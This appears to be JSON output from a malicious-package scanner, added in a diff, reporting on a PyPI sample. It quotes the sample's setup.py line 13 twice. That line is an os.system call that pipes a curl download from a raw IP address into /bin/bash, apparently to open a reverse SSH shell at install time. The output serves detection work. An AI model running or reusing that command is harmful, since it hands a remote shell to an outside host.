@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "setup.py:13",
+                "code": "os.system('curl http://108.61.251.172:8080/revssh/108.61.251.172/2222 | /bin/bash')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "setup.py:13",
+                "code": "os.system('curl http://108.61.251.172:8080/revssh/108.61.251.172/2222 | /bin/bash')\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/mypackage1337-0.1.0"
+}
